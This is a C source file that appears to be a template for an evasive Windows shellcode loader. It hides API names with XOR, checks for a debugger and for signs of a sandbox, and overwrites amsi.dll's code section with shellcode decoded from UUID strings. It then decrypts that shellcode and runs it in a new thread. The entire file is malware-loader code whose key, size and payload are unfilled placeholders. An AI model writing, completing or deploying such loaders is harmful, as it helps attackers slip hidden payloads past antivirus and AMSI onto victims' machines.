
#include <Windows.h>
#include <TlHelp32.h>

#pragma comment (lib, "Rpcrt4.lib")

#define KEY "KEY"
#define KEYSIZE sizeof(decKey) - 1
#define SHELLSIZE "SIZE"


typedef LPVOID(WINAPI *VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI *CreateThreadFunc)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI *WaitForSingleObjectFunc)(HANDLE, DWORD);
typedef BOOL(WINAPI *CheckRemoteDebuggerPresentFunc)(HANDLE, PBOOL);


char cLib1Name[] = "kernel32.dll";
char cLib2Name[] = "amsi.dll";
char cVirtualProtect[] = "VirtualProtect";
char cCreateThread[] = "CreateThread";
char cWaitForSingleObject[] = "WaitForSingleObject";
char cCheckRemoteDebuggerPresentFunc[] = "CheckRemoteDebuggerPresent";

char decKey[] = "DECKEY";

char *uuids[] = "UUIDs";

unsigned char *pShell; 

VirtualProtectFunc pVirtualProtectFunc;
CreateThreadFunc pCreateThreadFunc;
WaitForSingleObjectFunc pWaitForSingleObjectFunc;
CheckRemoteDebuggerPresentFunc pCheckRemoteDebuggerPresentFunc;

void deObfuscateData(char *data)
{
    for (int idx = 0; idx < strlen(data); idx++)
    {
        data[idx] = data[idx] ^ KEY;
    }
    
}

void deObfuscateAll()
{
    deObfuscateData(decKey);
    deObfuscateData(cLib1Name);
    deObfuscateData(cLib2Name);
    deObfuscateData(cVirtualProtect);
    deObfuscateData(cCreateThread);
    deObfuscateData(cWaitForSingleObject);
    deObfuscateData(cCheckRemoteDebuggerPresentFunc);
}

void decShell()
{
    for (int idx = 0, ctr = 0; idx < SHELLSIZE; idx++)
    {
        ctr = (ctr == KEYSIZE) ? 0 : ctr;
        pShell[idx] = pShell[idx] ^ decKey[ctr++];
    }

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{  
    DWORD_PTR pFuncAddr, pShellReader;
    DWORD dwOldProtect = 0;
    HMODULE hModule, hModule2;
    HANDLE hThread;
    BOOL bTrap = FALSE;
    char *pMem;
    int nMemAlloc, nCtr = 0;

    if (CreateFileA(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
    {
        return EXIT_FAILURE;
    }

    deObfuscateAll();

    if (!(
        (hModule = LoadLibraryA((LPCSTR)cLib1Name)) &&
        (hModule2 = LoadLibraryA((LPCSTR)cLib2Name))
    )) {
        return EXIT_FAILURE;
    }

    if (!(
        (pVirtualProtectFunc = (VirtualProtectFunc) GetProcAddress(hModule, cVirtualProtect)) &&
        (pCreateThreadFunc = (CreateThreadFunc) GetProcAddress(hModule, cCreateThread)) &&
        (pWaitForSingleObjectFunc = (WaitForSingleObjectFunc) GetProcAddress(hModule, cWaitForSingleObject)) &&
        (pCheckRemoteDebuggerPresentFunc = (CheckRemoteDebuggerPresentFunc) GetProcAddress(hModule, cCheckRemoteDebuggerPresentFunc))
    )) {
        return EXIT_FAILURE;
    }
    
    if (!pCheckRemoteDebuggerPresentFunc(GetCurrentProcess(), &bTrap) || bTrap)
    {
        return EXIT_FAILURE;
    }

    nMemAlloc = KEY << 20;

    if (!(pMem = (char *) malloc(nMemAlloc)))
    {
        return EXIT_FAILURE;
    }

    for (int idx = 0; idx < nMemAlloc; idx++)
    {
        pMem[nCtr++] = 0x00;
    }
    
    if (nMemAlloc != nCtr)
    {
        return EXIT_FAILURE;
    }

    pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;
    pShell = (unsigned char *) pFuncAddr;
    pShellReader = (DWORD_PTR) pShell;

    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    for (int idx = 0; idx < sizeof(uuids) / sizeof(PCHAR); idx++)
    {
        if (UuidFromStringA((RPC_CSTR)uuids[idx], (UUID *)pShellReader) == RPC_S_INVALID_STRING_UUID)
        {
            return EXIT_FAILURE;
        }
        
        pShellReader += 0x10;
    }

    free(pMem);
    decShell();
    

    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, dwOldProtect, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    if ((hThread = pCreateThreadFunc(0, 0, (LPTHREAD_START_ROUTINE)pFuncAddr, 0, 0, 0)) == NULL)
    {
        return EXIT_FAILURE;
    }

    pWaitForSingleObjectFunc(hThread, -1);

    return EXIT_SUCCESS;
}